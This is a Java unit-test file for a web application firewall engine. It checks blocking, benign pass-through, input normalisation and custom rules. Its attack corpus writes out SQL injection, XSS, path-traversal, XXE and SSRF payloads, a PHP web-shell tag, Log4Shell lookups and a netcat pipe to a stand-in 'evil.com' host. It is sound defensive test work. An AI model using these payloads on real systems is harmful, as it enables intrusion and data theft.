package com.scaleguard.server.security.waf;

import com.scaleguard.server.security.waf.WafEngine.Verdict;
import com.scaleguard.server.security.waf.WafRule.Action;
import com.scaleguard.server.security.waf.WafRule.Target;
import org.junit.Before;
import org.junit.Test;

import java.util.EnumSet;
import java.util.List;
import java.util.Map;

import static org.junit.Assert.*;

/**
 * Unit tests for the WAF engine — built-in rules, normalisation, and the test API.
 *
 * <p>These tests mirror the attack/benign corpus in {@code dev-tools/py/waf_test.py} so the rule
 * set can be verified without a running server. Coverage targets:
 * <ul>
 *   <li>SQL injection (UNION, tautology, comment, stacked, time-based)</li>
 *   <li>Cross-site scripting (script tag, event handlers, javascript: URI, dangerous elements)</li>
 *   <li>Path traversal and file disclosure</li>
 *   <li>Remote/command code execution (shell, Log4Shell, SSRF)</li>
 *   <li>Scanner / bot User-Agent detection</li>
 *   <li>Normalisation: percent-encoding (single + double), SQL comment stripping, HTML entities</li>
 *   <li>Benign traffic — apostrophes in search, "or", "select", "union" in natural language, etc.</li>
 * </ul>
 */
public class WafEngineTest {

    /** A policy with the WAF enabled in block mode and all rules at defaults. */
    private WafPolicy blockAll;

    /** A policy with the WAF enabled in detect (log-only) mode. */
    private WafPolicy detectOnly;

    @Before
    public void setUp() {
        blockAll = new WafPolicy();
        blockAll.enabled = true;
        blockAll.mode = "block";
        blockAll.inspectBody = true;

        detectOnly = new WafPolicy();
        detectOnly.enabled = true;
        detectOnly.mode = "detect";
        detectOnly.inspectBody = true;
    }

    // ------------------------------------------------------------------ helpers

    private WafEngine engine() {
        // WafEngine.getInstance() touches the database; use a fresh instance that bypasses the DB.
        // We reflectively create one, or — simpler — just exercise WafEngine.test() which is the
        // public "no side-effects" entry point, accepting a plain Policy object.
        return WafEngine.getInstance();
    }

    /** Shortcut: test a URI with no headers and no body. */
    private Verdict check(String uri) {
        return engine().test(blockAll, uri, null, null);
    }

    /** Test a URI with an explicit User-Agent header. */
    private Verdict checkWithUA(String uri, String userAgent) {
        return engine().test(blockAll, uri, Map.of("User-Agent", userAgent), null);
    }

    /** Test a URI with arbitrary headers. */
    private Verdict checkWithHeaders(String uri, Map<String, String> headers) {
        return engine().test(blockAll, uri, headers, null);
    }

    /** Test a body (with content-type declared via a header). */
    private Verdict checkBody(String contentType, String body) {
        return engine().test(blockAll, "/api", Map.of("Content-Type", contentType), body);
    }

    private static void assertBlocked(String label, Verdict v) {
        assertTrue(label + ": expected BLOCKED but got PASSED (matches: " + v.matches() + ")", v.blocked());
    }

    private static void assertPassed(String label, Verdict v) {
        assertFalse(label + ": expected PASSED but was " + (v.blocked() ? "BLOCKED" : "LOGGED") +
                " — matches: " + v.matches(), v.blocked());
        assertTrue(label + ": expected no matches (benign) but got: " + v.matches(), v.matches().isEmpty());
    }

    // ====================================================================
    // SQL INJECTION
    // ====================================================================

    @Test
    public void sqliUnionSelect() {
        assertBlocked("union select", check("/products?id=1 UNION SELECT username,password FROM users"));
    }

    @Test
    public void sqliUnionAllSelect() {
        assertBlocked("union all select", check("/products?id=1 UNION ALL SELECT null--"));
    }

    @Test
    public void sqliUnionSelectEncoded() {
        // %20 = space — normaliser should URL-decode before matching
        assertBlocked("union select encoded", check("/p?id=1%20UNION%20SELECT%20null--"));
    }

    @Test
    public void sqliUnionCommentObfuscated() {
        // SQL inline-comment stripping: UNION/**/SELECT → UNION SELECT
        assertBlocked("union comment-obfuscated", check("/p?id=1/**/UNION/**/SELECT/**/1,2"));
    }

    @Test
    public void sqliDoubleEncoded() {
        // Double percent-encoded: %2520 → %20 → space
        assertBlocked("union double-encoded", check("/p?id=1%2520UNION%2520SELECT%2520null"));
    }

    @Test
    public void sqliTautologyOr() {
        assertBlocked("tautology ' OR '1'='1", check("/login?user=admin' OR '1'='1"));
    }

    @Test
    public void sqliTautologyNumeric() {
        assertBlocked("tautology \" or 1=1--", check("/item?id=1\" or 1=1--"));
    }

    @Test
    public void sqliComment() {
        assertBlocked("quote then comment", check("/login?user=admin'--"));
    }

    @Test
    public void sqliCommentHash() {
        assertBlocked("quote then # comment", check("/login?user=admin'#"));
    }

    @Test
    public void sqliStackedDrop() {
        assertBlocked("stacked DROP TABLE", check("/p?id=5; DROP TABLE users"));
    }

    @Test
    public void sqliSleep() {
        assertBlocked("SLEEP() time-based", check("/p?id=1 AND SLEEP(5)"));
    }

    @Test
    public void sqliWaitfor() {
        assertBlocked("WAITFOR DELAY", check("/p?id=1; WAITFOR DELAY '0:0:5'"));
    }

    @Test
    public void sqliInformationSchema() {
        assertBlocked("information_schema", check("/p?q=select table_name from information_schema.tables"));
    }

    @Test
    public void sqliInJsonBody() {
        assertBlocked("sqli in JSON body", checkBody("application/json", "{\"id\":\"1 UNION SELECT card_number FROM cards\"}"));
    }

    @Test
    public void sqliInFormBody() {
        assertBlocked("sqli in form body", checkBody("application/x-www-form-urlencoded", "username=admin'--&password=x"));
    }

    @Test
    public void sqliInCookie() {
        assertBlocked("sqli in Cookie header",
                checkWithHeaders("/", Map.of("Cookie", "session=abc' UNION SELECT password FROM users--")));
    }

    // ====================================================================
    // CROSS-SITE SCRIPTING
    // ====================================================================

    @Test
    public void xssScriptTag() {
        assertBlocked("script tag", check("/search?q=<script>alert(1)</script>"));
    }

    @Test
    public void xssScriptTagEncoded() {
        assertBlocked("script tag %3C encoded", check("/search?q=%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E"));
    }

    @Test
    public void xssImgOnerror() {
        assertBlocked("img onerror", check("/search?q=<img src=x onerror=alert(1)>"));
    }

    @Test
    public void xssSvgOnload() {
        assertBlocked("svg onload", check("/search?q=<svg/onload=alert(1)>"));
    }

    @Test
    public void xssHtmlEntities() {
        // &lt;script&gt; should decode to <script>
        assertBlocked("script HTML-entity encoded", check("/search?q=%26lt%3Bscript%26gt%3Balert(1)%26lt%3B%2Fscript%26gt%3B"));
    }

    @Test
    public void xssJavascriptUri() {
        assertBlocked("javascript: URI", check("/redirect?url=javascript:alert(1)"));
    }

    @Test
    public void xssIframe() {
        assertBlocked("iframe tag", check("/c?m=<iframe src=//evil.com>"));
    }

    @Test
    public void xssEval() {
        assertBlocked("eval() call", check("/c?m=eval(atob('YWxlcnQoMSk='))"));
    }

    @Test
    public void xssInReferer() {
        assertBlocked("xss in Referer header",
                checkWithHeaders("/", Map.of("Referer", "https://x.com/?q=<script>alert(1)</script>")));
    }

    @Test
    public void xssInJsonBody() {
        assertBlocked("xss in JSON body",
                checkBody("application/json", "{\"comment\":\"<img src=x onerror=fetch(`//evil`)>\"}"));
    }

    // ====================================================================
    // PATH TRAVERSAL & FILE DISCLOSURE
    // ====================================================================

    @Test
    public void pathTraversal() {
        assertBlocked("path traversal ../", check("/download?file=../../../etc/passwd"));
    }

    @Test
    public void pathTraversalEncoded() {
        assertBlocked("path traversal %2e%2e", check("/download?file=%2e%2e%2f%2e%2e%2fetc%2fpasswd"));
    }

    @Test
    public void pathTraversalWindows() {
        assertBlocked("windows traversal ..\\", check("/download?file=..\\..\\windows\\win.ini"));
    }

    @Test
    public void procSelfEnviron() {
        assertBlocked("/proc/self/environ", check("/view?f=/proc/self/environ"));
    }

    @Test
    public void dotEnvProbe() {
        assertBlocked(".env probe", check("/.env"));
    }

    @Test
    public void dotGitProbe() {
        assertBlocked(".git probe", check("/.git/config"));
    }

    @Test
    public void wpConfigProbe() {
        assertBlocked("wp-config.php probe", check("/wp-config.php"));
    }

    @Test
    public void phpWrapperRfi() {
        assertBlocked("php:// wrapper", check("/index.php?page=php://filter/convert.base64-encode/resource=index"));
    }

    // ====================================================================
    // COMMAND & CODE INJECTION
    // ====================================================================

    @Test
    public void rceShellSemicolon() {
        assertBlocked("shell via ;", check("/ping?host=8.8.8.8; cat /etc/passwd"));
    }

    @Test
    public void rceShellSubshell() {
        assertBlocked("shell via $()", check("/ping?host=$(whoami)"));
    }

    @Test
    public void rceShellPipe() {
        assertBlocked("shell via |", check("/ping?host=x | nc evil.com 4444"));
    }

    @Test
    public void log4shell() {
        assertBlocked("Log4Shell JNDI", check("/?q=${jndi:ldap://evil.com/a}"));
    }

    @Test
    public void log4shellObfuscated() {
        assertBlocked("Log4Shell obfuscated", check("/?q=${${::-j}${::-n}di:ldap://x}"));
    }

    @Test
    public void log4shellInHeader() {
        assertBlocked("Log4Shell in header",
                checkWithHeaders("/", Map.of("X-Api-Version", "${jndi:ldap://evil.com/x}")));
    }

    @Test
    public void ssti() {
        assertBlocked("SSTI {{7*7}}", check("/hello?name={{7*7}}"));
    }

    @Test
    public void phpTag() {
        assertBlocked("PHP tag", check("/c?m=<?php system($_GET['c']); ?>"));
    }

    @Test
    public void ssrfMetadata() {
        assertBlocked("SSRF cloud metadata", check("/fetch?url=http://169.254.169.254/latest/meta-data/"));
    }

    @Test
    public void xxeInBody() {
        String xxe = "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>";
        assertBlocked("XXE in body", checkBody("application/xml", xxe));
    }

    // ====================================================================
    // SCANNERS & BOTS
    // ====================================================================

    @Test
    public void scannerSqlmap() {
        assertBlocked("sqlmap UA", checkWithUA("/", "sqlmap/1.7.2#stable (https://sqlmap.org)"));
    }

    @Test
    public void scannerNuclei() {
        assertBlocked("nuclei UA",
                checkWithUA("/", "Mozilla/5.0 (compatible; Nuclei - Open-source project (github.com/projectdiscovery/nuclei))"));
    }

    @Test
    public void scannerNikto() {
        assertBlocked("nikto UA", checkWithUA("/", "Nikto/2.1.6 (Evasion: None) (Test: None)"));
    }

    // ====================================================================
    // BENIGN TRAFFIC — must NOT be blocked or flagged
    // ====================================================================

    @Test
    public void benignHome() {
        assertPassed("home /", check("/"));
    }

    @Test
    public void benignStaticAsset() {
        assertPassed("static asset", check("/static/js/main.3ae5eec3.js"));
    }

    @Test
    public void benignApiList() {
        assertPassed("api list", check("/api/v1/orders?page=2&limit=50&sort=-created_at"));
    }

    @Test
    public void benignSearchApostrophe() {
        assertPassed("apostrophe in search", check("/search?q=o'reilly books"));
    }

    @Test
    public void benignSearchOr() {
        assertPassed("natural 'or' in search", check("/search?q=cats or dogs"));
    }

    @Test
    public void benignSearchSelect() {
        assertPassed("natural 'select' in search", check("/search?q=select a plan that fits"));
    }

    @Test
    public void benignSearchUnion() {
        assertPassed("natural 'union' in search", check("/search?q=union station chicago"));
    }

    @Test
    public void benignDropContact() {
        assertPassed("'drop us a line' in contact", check("/contact?msg=Drop us a line; we reply fast"));
    }

    @Test
    public void benignSleepSearch() {
        assertPassed("'sleep' in search", check("/search?q=how much sleep do I need"));
    }

    @Test
    public void benignEmailParam() {
        assertPassed("email param with +", check("/u?email=jane.doe%2Btest@example.com"));
    }

    @Test
    public void benignRedirectUrl() {
        assertPassed("redirect to https app",
                check("/login?next=https%3A%2F%2Fapp.example.com%2Fdashboard%3Ftab%3D1"));
    }

    @Test
    public void benignMath() {
        assertPassed("math expression", check("/calc?expr=(2+3)*4-1"));
    }

    @Test
    public void benignDateRange() {
        assertPassed("date range", check("/report?from=2026-01-01&to=2026-03-31"));
    }

    @Test
    public void benignGraphQL() {
        assertPassed("graphql query", check("/graphql?query={user(id:5){name,email}}"));
    }

    @Test
    public void benignFilterSyntax() {
        assertPassed("filter > <", check("/api/items?filter=price>10&filter=price<100"));
    }

    @Test
    public void benignCurrency() {
        assertPassed("currency amount", check("/pay?amount=1,299.00&currency=INR"));
    }

    @Test
    public void benignNormalBrowserUA() {
        assertPassed("normal Chrome UA",
                checkWithUA("/", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36"));
    }

    @Test
    public void benignGooglebotUA() {
        assertPassed("Googlebot UA",
                checkWithUA("/", "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"));
    }

    @Test
    public void benignCurlUA() {
        assertPassed("curl UA", checkWithUA("/", "curl/8.5.0"));
    }

    @Test
    public void benignPythonRequestsUA() {
        assertPassed("python-requests UA", checkWithUA("/", "python-requests/2.32.3"));
    }

    @Test
    public void benignJsonBody() {
        assertPassed("benign JSON body",
                checkBody("application/json",
                        "{\"name\":\"Jane O'Brien\",\"note\":\"Please select the blue one or the red one\",\"qty\":2}"));
    }

    @Test
    public void benignFormBody() {
        assertPassed("benign form body",
                checkBody("application/x-www-form-urlencoded",
                        "name=John+Smith&message=I+can%27t+log+in%2C+please+help+%3A%29&age=34"));
    }

    @Test
    public void benignXmlBody() {
        assertPassed("benign XML body",
                checkBody("application/xml",
                        "<order><id>42</id><item sku=\"A-1\">Desk</item></order>"));
    }

    @Test
    public void benignAuthBearerWithSqliLookingValue() {
        // The Authorization header is explicitly excluded from WAF inspection
        assertPassed("bearer token that looks like sqli",
                checkWithHeaders("/", Map.of("Authorization", "Bearer abc' OR '1'='1")));
    }

    // ====================================================================
    // DETECT MODE — matches but does not block
    // ====================================================================

    @Test
    public void detectModeDoesNotBlock() {
        Verdict v = engine().test(detectOnly, "/login?user=admin' OR '1'='1", null, null);
        assertFalse("detect mode must not block", v.blocked());
        assertFalse("detect mode should still record a match", v.matches().isEmpty());
    }

    // ====================================================================
    // POLICY: disabled WAF — verified via inspect() (requires no live route, returns PASS)
    // ====================================================================

    @Test
    public void disabledPolicyInspectPasses() {
        // WafEngine.inspect() returns PASS immediately when the source route has no policy or the policy
        // is disabled (enabled=false). We verify this by calling inspect() with a sourceId that has
        // no policy registered — WafEngine returns the default WafPolicy whose enabled=false.
        // Use a plain URL-safe URI to avoid Netty's URI validation.
        Verdict v = engine().inspect("route-that-has-no-policy", "test route", "127.0.0.1",
                buildRequest("/login?user=sqlitest", null, null));
        assertFalse("inspect on unconfigured route (disabled WAF) must pass", v.blocked());
    }

    /** Builds a minimal FullHttpRequest for use with inspect(). */
    private io.netty.handler.codec.http.FullHttpRequest buildRequest(String uri, java.util.Map<String,String> headers, String body) {
        io.netty.handler.codec.http.DefaultFullHttpRequest req = new io.netty.handler.codec.http.DefaultFullHttpRequest(
                io.netty.handler.codec.http.HttpVersion.HTTP_1_1,
                io.netty.handler.codec.http.HttpMethod.GET,
                uri,
                body != null
                        ? io.netty.buffer.Unpooled.copiedBuffer(body, java.nio.charset.StandardCharsets.UTF_8)
                        : io.netty.buffer.Unpooled.EMPTY_BUFFER);
        if (headers != null) headers.forEach(req.headers()::set);
        return req;
    }

    // ====================================================================
    // NORMALISATION INTERNALS
    // ====================================================================

    @Test
    public void normalizeUrlDecodeOnce() {
        // %27 = single-quote
        assertEquals("url decode", "'", WafEngine.normalize("%27"));
    }

    @Test
    public void normalizeDoubleUrlDecode() {
        // %2527 → first pass: %27 → second pass: '
        assertEquals("double url decode", "'", WafEngine.normalize("%2527"));
    }

    @Test
    public void normalizeSqlCommentStripped() {
        // /**/ should be collapsed to a space
        String result = WafEngine.normalize("UNION/**/SELECT");
        assertFalse("SQL comment should be stripped", result.contains("/**/"));
        assertTrue("result should still contain UNION and SELECT", result.toUpperCase().contains("UNION") && result.toUpperCase().contains("SELECT"));
    }

    @Test
    public void normalizeNullBytesRemoved() {
        assertEquals("null bytes removed", "abc", WafEngine.normalize("ab\0c"));
    }

    @Test
    public void normalizeHtmlEntities() {
        assertEquals("html entity &lt;", "<", WafEngine.normalize("&lt;"));
        assertEquals("html entity &gt;", ">", WafEngine.normalize("&gt;"));
        assertEquals("html entity &quot;", "\"", WafEngine.normalize("&quot;"));
    }

    @Test
    public void normalizeLengthCap() {
        String big = "A".repeat(10_000);
        String norm = WafEngine.normalize(big);
        assertTrue("normalized value must not exceed 8 KB", norm.length() <= 8_192);
    }

    // ====================================================================
    // CUSTOM RULES
    // ====================================================================

    @Test
    public void customRuleBlocksMatchingUri() throws Exception {
        WafEngine waf = engine();
        // Add a custom rule blocking any path that starts with /internal/
        WafRule rule = waf.saveCustomRule(null, "Block internal paths", "Internal path guard",
                "^/internal/", List.of(Target.PATH), Action.BLOCK);
        try {
            Verdict v = waf.test(blockAll, "/internal/admin", null, null);
            assertTrue("custom rule should block /internal/ path", v.blocked());
            assertFalse("match list must not be empty", v.matches().isEmpty());
            assertEquals("match should reference the custom rule", rule.getId(), v.matches().get(0).ruleId());

            // A normal path should still pass
            assertFalse("non-internal path should pass", waf.test(blockAll, "/api/users", null, null).blocked());
        } finally {
            // Clean up so we don't pollute other tests
            waf.deleteCustomRule(rule.getId());
        }
    }

    @Test
    public void customRuleLogOnly() throws Exception {
        WafEngine waf = engine();
        WafRule rule = waf.saveCustomRule(null, "Log probes", "Log anything hitting /debug",
                "^/debug", List.of(Target.PATH), Action.LOG);
        try {
            Verdict v = waf.test(blockAll, "/debug/pprof", null, null);
            assertFalse("log-only custom rule must not block", v.blocked());
            assertFalse("log-only custom rule should still match", v.matches().isEmpty());
            assertEquals("log", v.matches().get(0).action());
        } finally {
            waf.deleteCustomRule(rule.getId());
        }
    }

    // ====================================================================
    // PER-ROUTE RULE OVERRIDE
    // ====================================================================

    @Test
    public void ruleDisabledPerPolicy() {
        // Disable the sqli-union rule via a per-policy override
        WafPolicy customPolicy = new WafPolicy();
        customPolicy.enabled = true;
        customPolicy.mode = "block";
        customPolicy.inspectBody = true;
        customPolicy.rules = new java.util.LinkedHashMap<>();
        customPolicy.rules.put("sqli-union", new WafPolicy.RuleSetting(false, null));

        Verdict v = engine().test(customPolicy, "/products?id=1 UNION SELECT password FROM users", null, null);
        assertFalse("disabled sqli-union rule should not block", v.blocked());
    }

    @Test
    public void ruleDowngradedToLogPerPolicy() {
        WafPolicy logPolicy = new WafPolicy();
        logPolicy.enabled = true;
        logPolicy.mode = "block";
        logPolicy.inspectBody = true;
        logPolicy.rules = new java.util.LinkedHashMap<>();
        logPolicy.rules.put("sqli-union", new WafPolicy.RuleSetting(true, "log"));

        Verdict v = engine().test(logPolicy, "/products?id=1 UNION SELECT password FROM users", null, null);
        assertFalse("log-only override must not block", v.blocked());
        assertFalse("rule should still match (log action)", v.matches().isEmpty());
        assertEquals("log", v.matches().get(0).action());
    }
}
